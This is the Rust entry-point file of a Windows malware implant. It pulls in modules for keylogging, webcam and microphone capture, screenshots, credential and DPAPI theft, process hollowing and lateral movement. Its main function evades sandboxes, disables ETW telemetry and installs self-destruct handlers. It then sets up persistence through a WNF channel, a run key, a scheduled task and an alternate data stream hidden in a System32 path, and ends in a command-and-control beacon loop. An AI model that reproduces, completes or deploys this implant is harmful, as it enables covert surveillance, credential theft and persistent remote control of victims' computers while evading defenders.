//! main.rs — Implant entry point
//!
//! Boot sequence:
//!   1. Anti-analysis checks (bail out if sandbox detected)
//!   2. ETW blind
//!   3. Ctrl handler + VEH installation
//!   4. Guardian thread launch
//!   5. WNF persistence channel
//!   6. C2 beacon loop (never returns)

#![allow(non_snake_case, dead_code)]
#![windows_subsystem = "windows"]

mod antidetect;
mod c2;
mod defs;
mod dpapi;
mod etw_patch;
mod guardian;
mod hashes;
mod hollow;
mod indirect_syscall;
mod keylog;
mod lateral;
mod loader;
mod pe_obfuscate;
mod persist;
mod post_shutdown;
mod ppldump;
mod resurrect;
mod sac_bypass;
mod screenshot;
mod selfdestruct;
mod sleep;
mod spoof;
mod stomp;
mod syscall;
mod threadless_inject;
mod token;
mod unhook;
mod utils;
mod watchdog;
mod filetransfer;
mod mic;
mod webcam;

// Compile the ssn_audit binary only when the feature flag is set.
// This keeps it out of the release implant entirely.
#[cfg(feature = "ssn-audit")]
mod ssn_audit;

// ─── Shared key used by sleep.rs obfuscator + resurrect.rs ADS decrypt ───────
// 16-byte XOR key — change before each engagement.
pub static SLEEP_KEY: [u8; 16] = [
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
    0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF,
];

fn main() {
    unsafe { run() }
}

unsafe fn run() -> ! {
    // ── 1. Sandbox / anti-analysis gate ──────────────────────────────────────
    if antidetect::all_checks() {
        // Running in a sandbox — terminate silently without leaving artifacts
        winapi::um::processthreadsapi::TerminateProcess(
            winapi::um::processthreadsapi::GetCurrentProcess(),
            0,
        );
        loop {}
    }

    // ── 2. ETW blind ─────────────────────────────────────────────────────────
    etw_patch::apply_all_blinds();

    // ── 3. Install Ctrl handler + VEH ────────────────────────────────────────
    selfdestruct::register_ctrl_handler();
    let fn_add_veh = indirect_syscall::resolve_add_veh();
    guardian::install_veh(fn_add_veh, selfdestruct::full_destruct);

    // ── 4. Guardian thread ───────────────────────────────────────────────────
    let fn_ntqsi    = indirect_syscall::resolve_ntqsi();
    let fn_sleep_ms = indirect_syscall::resolve_sleep();
    let fn_tick     = indirect_syscall::resolve_tick();

    guardian::start_thread(
        fn_ntqsi,
        fn_sleep_ms,
        fn_tick,
        selfdestruct::wipe_self,
        persist::purge_all,
        resurrect::drop_from_ads,
        persist::install_all,
        hollow::inject_svchost,
    );

    // ── 5. Module-stomping (IAT clean-up) ────────────────────────────────────
    // stomp::stomp takes (module_name: &str, payload: &[u8])
    // Called with a benign decoy module name and an empty slice — the real
    // stomping payload is staged by the operator via C2.
    stomp::stomp("version.dll", &[]);

    // ── 6. WNF persistence channel ───────────────────────────────────────────
    // post_shutdown::install_wnf_channel signature (7 params):
    //   fn install_wnf_channel(
    //       state_name: u64,
    //       payload:    &[u8],
    //       key:        &[u8; 16],
    //       run_key:    bool,
    //       schtask:    bool,
    //       ads_path:   &str,
    //       tag:        u32,
    //   )
    post_shutdown::install_wnf_channel(
        0x41C64E6D_u64,                          // WNF state name (obfuscated)
        &[],                                      // payload (operator-supplied via C2)
        &SLEEP_KEY,                               // encryption key
        true,                                     // also write run key
        true,                                     // also write scheduled task
        "C:\\Windows\\System32\\en-US\\shell32.dll", // ADS host path
        0x4352_4344_u32,                          // tag / magic
    );

    // ── 7. C2 beacon loop (never returns) ───────────────────────────────────
    c2::run()
}
